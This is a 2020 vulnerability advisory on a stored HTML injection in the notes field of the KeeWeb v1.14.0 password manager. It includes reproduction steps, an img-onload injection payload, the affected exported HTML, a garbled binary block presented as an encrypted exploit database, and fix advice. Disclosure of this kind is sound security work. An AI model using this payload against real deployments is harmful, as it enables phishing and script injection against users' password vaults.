Document Title:
===============
KeeWeb v1.14.0 - (Notes) Html Inject Web Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2237


Release Date:
=============
2020-05-06


Vulnerability Laboratory ID (VL-ID):
====================================
2237


Common Vulnerability Scoring System:
====================================
4.2


Vulnerability Class:
====================
Script Code Injection


Current Estimated Price:
========================
1.000â‚¬ - 2.000â‚¬


Product & Service Introduction:
===============================
Free cross-platform password manager compatible with KeePass. Web
version has almost all features available in desktop apps.
It doesn't require any installation and works in all modern browsers.
Desktop apps look beautiful on each platform: macOS,
Windows and Linux. You can open local files in Desktop apps.

(Copy of the Homepage: https://keeweb.info/  &  https://app.keeweb.info/)


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a html
injection web vulnerability in the KeeWeb v1.14.0 online service
web-application.


Affected Product(s):
====================
KeeWeb
Product: KeeWeb v1.14.0 - Online Service (Web-Application)
Product: KeeWeb v1.14.0 x64 - Windows Desktop Client (Software)


Vulnerability Disclosure Timeline:
==================================
2020-05-06: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Authentication Type:
====================
Restricted authentication (user/moderator) - User privileges


User Interaction:
=================
Medium User Interaction


Disclosure Type:
================
Independent Security Research


Technical Details & Description:
================================
A html injection web vulnerability has been discovered in the official
KeeWeb v1.14.0 online service web-application.
The vulnerability allows remote attackers to inject own malicious html
codes with persistent attack vector to compromise browser
to web-application requests from the application-side.

The html inject web vulnerability is located in the notes input field of
the new entry add module. Local privileged accounts are able
to compromise the stored database entries by inject of simple html code.
After the inject the execution points of the issue are located
in the New Entry or on export as HTML5 file. The execute occurs in both
cases on review in the vulnerable marked fields of the input.
The request method to inject is POST and the attack vector is located on
the application-side. The issue is a classic html injection.
There is already a poc exploit in the wild available with the expected
client database format to import after the export.

Successful exploitation of the web vulnerability results in persistent
phishing attacks, persistent external redirects to malicious
source and persistent manipulation of affected application modules.

Request Method(s):
[+] POST

Vulnerable Module(s):
[+] New

Vulnerable Parameter(s):
[+] Notes

Affected Module(s):
[+] New entries on preview
[+] Export as HTML5 file


Proof of Concept (PoC):
=======================
The html inject web vulnerability can be exploited by remote attackers
with privileged user account or via medium user interaction.
For security demonstration or to reproduce the vulnerability follow the
provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Open the KeeWeb application
2. Add a new Database
3. Include a new entry
4. Inject to the Notes input field your html payload with external request
5. Save the entry and export the kdbx or as html5
Note: The execution of the html code occurs on preview of the entry or
open of the html file
6. Successful reproduce of the vulnerability!


PoC: Payload
<img%20src="https://www.evolution-sec.com/evosec-logo.png"%20onload=alert(document.domain)>


PoC: Vulnerable Source (Export HTML5)
<td>Notes</td><td>
<div class="markdown"><blockquote>
<p><img%20src="https://www.evolution-sec.com/evosec-logo.png"%20onload=alert(document.domain)></p>
</blockquote>
</div></td></tr>
<tr><td>New Field</td>


PoC: Exploit (kdbx - aes encrypted) (passwd:test)
Ã™Â¢Å¡gÃ»KÂµ   1ÃÃ²Ã¦Â¿qCPÂ¾X!jÃ¼ZÃ¿    
Ã³dÃ¥ÂµÂ¡Ã¼ÂªÂ­_7uÅ½Å¸aHÃ3j2Â¨sfÃ²KÃ™Ã®
AÂ¶CÂ½3Ã¢Ã€Â¥Ã©WÃ­>P9Â-CÂ5sÃjâ„¢PÂâ€šyÃ¥ Ã â€œ      nhÃ‰OTÃ‡QMÃœ3Ã‘Ã«.
T[1Ã¸GÃ¦T.Å¸Ã­Ã”Â·Y
FÃ“jhÂ·â€¡Ã•'ÃŠ,Â®}&Ã¨o	  nyÃ¼Â¢.Â½Ã¼Ãµ2=Â§Ã”Â® @:Â¸Ã¦ZEJ]Ã–,<RÃ„h
       ÃÂ­
TÃ¬JÂ§Â«kA0Â¥5ZÅ¡Â¥YÂ©yÃ«â€°Â*ÃŠÃƒÃƒÃšeÃÃ¾â„¢;w
Â¹Ë†eÃ™Ã³Ã¤Ãâ€¦Â©â€¡BGÃ¶â€ g/Ã¬NnoyyÂ­â€¦Ã¨Ã®5Â±2H
Ã¬shÂ©?bÃ–.Ã¿Ã¸qfÅ¾6â€°#qÃ¥Ã¦Ã¿;â€œâ€ºÃŒâ€¦=Â³sÃ½GÂ¶Ãµ~nÃ·ÃŠÃÂ¸
Â¿Ã˜,@@â„¢Â«9ÂÃ Ã­ÃˆEqÃ¾Ã´Â«Ã–â€šÃ¨Sn's5ÂGt"QÃÃŠÂ¢XÅ¾Ã­XZâ€šËœÂµN-
Â©Â©â€ºÂ¥Ã­`4WÂ«ÃµÅ½Ã¢ÃÃ„Ã¨(XÅ¾Ã“GÂ­Ã„{Â¨Ã Å¡Ã†Ã°Â¨Å½klÃ°
>Ã“ Â¬Â¯ctÂ«Ââ€™l"Å Ã£Mga.OkÃ°vÃ©Ã‰4?]ÃšJ&Æ’Ã¨Ã°ÂµÂ¶t!U|kM -ÃÃ•Ã£+
Â©Ë†czÅ’[pÃÂªÅ“Â²Ãµâ‚¬AÂiÂµÂ¦ÃojÃoÃ¥Ã®ËœÂ±Ã°LÃ¨Â©Ã¬Â¹Â°ÃÃ¹Å¡Ã/â€˜gÂ¤Ã’
ZÃ–Ã–DÃ­tÂ½Â¦4Â¬Â´Ã³Å½Ã¥GÃ¥â€ â€“Â®Â¢Ã‹Â¥Â°Ã«Å“ÃŸÃ³jjÂ¬cW2Â¹*	Â³ÂµÂ±	Â¯Â¿3fÃ’#
s(?Â«â€¦]SÃ¶Â°Ã¯KÃœÂ¥2ÂÃ°1ËœË†K{^Ã›Ã­QÃÅ’
Â¹Ã«K5%ÃµÂQ,DÃ´7Â¡Ã˜wa-QÅ¡â€“Ã¦.ÃŒÃ EÃ³,]	4mnÃ½Ã¬â€“Â¥Â¦89Â³Ã¢ÃnÃ¬Â²Å¡Ã„mÃ”Ã£<""Ã¾h^]Ã¼
â€™ÃÂ¤C gaLÅ“Â®Ã¤+.ÃºÃ­Ã¦E`Ã®
 Ã­EÃ¶
Ã Y(&hâ€™Ã£Â³uÅ¾Ã:Å¡jÅ½@Ã¡&Â£wÃ—Ubb~Ã§Ã¬rM:tÅ½Â£ÃºÅ ÂµÅ“Â­Â¨Â®Â®Ã­Ã§&ÃœHÂºÃ‘(Â©AÃ“ÃœÃ^ÂÃ“Â²Ã¯aÃ…Ã¢Æ’Ã‰Ã’Å¸Ã†jÃˆÂ¯UÃ†uiSâ€°ÂªÂ½1Â²2â€šÂ®LÃ±Ã©Ã¦6Ã¬Ã ÂÂºÃ¢M&$Ã‚Oâ€¢iPÂ¨~4-
ÃšÃ„feztÂ©Ã±@ÃšÂ´Å¸ÂiÂ¨5%Ã½â€Ã”ÂÃ¨&Ã‚Â²zh%Â¥h*8Â±Râ€˜Â¶3Â±Ã¬Â¥6OÅ¸F<Ã‚Å’WNÃšÂ¸oÃºÃ¬Ã¿o:1Â½Â«Â·GË†Â¡Â¶ÃÃ¥oÃ¨Å¾yÃ›40pÃ·Ãª9Â«Ãš_â€¹GÃ–iYÃ¤â€”Â¨=H$Qxwâ€¹EVÂ©Ã‹q7Ã—â€º[Ã¶BLÂÃµ(ÃŒÃ±Â±Ã­voQÂ­Â°Ã¢HÃ€ÃšÃ¦^5&SP
W0&:Ã¬RjÃ¦ÃmÃâ€œâ€Ã¿Â¨Å’6aÃ¥Â²Â·Ã¬tiÃxÃšQÃ¨HVÂ¿*lÂ¦_Ã©Ã«Ãâ€ Ã©1Ã»Ã
ÃªÃ¶Ââ€ºsâ€¦j@WÂ¨z ÂÃ±#ÂÅ X/2Ã£Â¬ÃŠj
AÂ·â€°Â¥=ÂÃ§â€ºÂ¼GÃ‹5Å“EÃ©Æ’Ã¯Ã”xs
Ã»ÃÃ’Å¸c5yÃ”pm%Ã¤}4TFbÃ¸Â³rk7`â€Ã‡epÂÃâ€š<ÃTÃ’Å¸Ãš<Ë†|Â¼Ã·vÃ‰Ã£Ã—@s0Ã¹C6xÃ­z>â€˜â€”G
4Ã’Â¸R0#|â‚¬KÂ¹Ãâ€šÂ®NMotÂ¯@GÃ˜]Âªâ€™ÃŸÃ«Ã™Ë†Ã°Ã©Â8Å¡2.F@Ã§Â½Ãº$-ÃsÃ€aÅ¸Ã‰pÃÃ£ Ë†$Ã•â€ºÃ…
;sPÃ€Å Ã¼1&z}Â£1Ã;Ã¦Ëœâ€™QuÅ“Ãƒâ„¢Â½-*â€ Â°Ã‘ÃŒÂ»APÃËœ:ÃÃÂ³%Â¤ Å½2Â«VÃ®~|â€“bds9.
ÂºR*kÂ­.Ã®rÃ¿Ã£Â»<|Ãx_ÂÂ±jÃƒvyÃ¹Â¢ÃªoÃ¬Â¶ugFÂ·u'Å Â£Crâ€¹F+dt	Ã‹tÃƒÃ’M}	â€Â­Â°jÃšbÃ¥Â¼Ã¬jYâ€°Â¿ËœÂ¤cÅ¡b
Ã‹#GÃµ2$WÂ¸t;Ã¤zÃ¥â€šÂ¼Ã±Å¾Ã¬?'Ã¸rÂ·nâ€™Ã¶Ã7Ã¦ÂªÃš-â€¹Ã‹Ã·(â€¡Â¢xâ€¦Ã–GÂ¬â€™Ã«Å¾â€¡Ã¤rAF=;-Ã<ÃÃ´.SÃ®(aWÃ¬Ã©|YÂ®Ã–Pb@Ã´.QÂ©_â€¢â€¡Ã—?AqËœÅ’UÃ’
sâ€¡Â¯L<Ã’2â€“Ã¦&Ãµâ‚¬Å“'tÃ—Ã¬6X9Ã¾
Å¡&%TÃœJâ€˜s=a"â€”â€°c{r?QdiÃ’wÃ®k@Ã”Â¸}ÃµzV{Å“@â€™Â±wÃ¼Ã¹Â¸Ã™Â´ÂCâ€¡oQR.49#â€¹YÃ¯Ã“Ã¦Ã¹Dâ€Ã±58Ãš


Solution - Fix & Patch:
=======================
The vulnerability can be resolved by an encode of the vulnerable output
parameters in the html5 files on export.
In a second step the input fields of the notes and others needs to be
restricted to disallow script code injects
The notes parameter needs to be escaped to ensure the injection point is
resolved.


Credits & Authors:
==================
Vulnerability-Lab -
https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
Benjamin Kunz Mejri -
https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without
any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability
and capability for a particular purpose. Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct,
indirect, incidental, consequential loss of business profits
or special damages, even if Vulnerability-Lab or its suppliers have been
advised of the possibility of such damages. Some states do
not allow the exclusion or limitation of liability for consequential or
incidental damages so the foregoing limitation may not apply.
We do not approve or encourage anybody to break any licenses, policies,
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
www.vulnerability-db.com
Services:   magazine.vulnerability-lab.com
paste.vulnerability-db.com 			infosec.vulnerability-db.com
Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php
vulnerability-lab.com/rss/rss_upcoming.php
vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php
vulnerability-lab.com/register.php
vulnerability-lab.com/list-of-bug-bounty-programs.php

Any modified copy or reproduction, including partially usages, of this
file requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified
form is granted. All other rights, including the use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers.
All pictures, texts, advisories, source code, videos and other
information on this website is trademark of vulnerability-lab team & the
specific authors or managers. To record, list, modify, use or
edit our material contact (admin@ or research@) to get a ask permission.

				    Copyright Â© 2020 | Vulnerability Laboratory - [Evolution
Security GmbH]â„¢




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
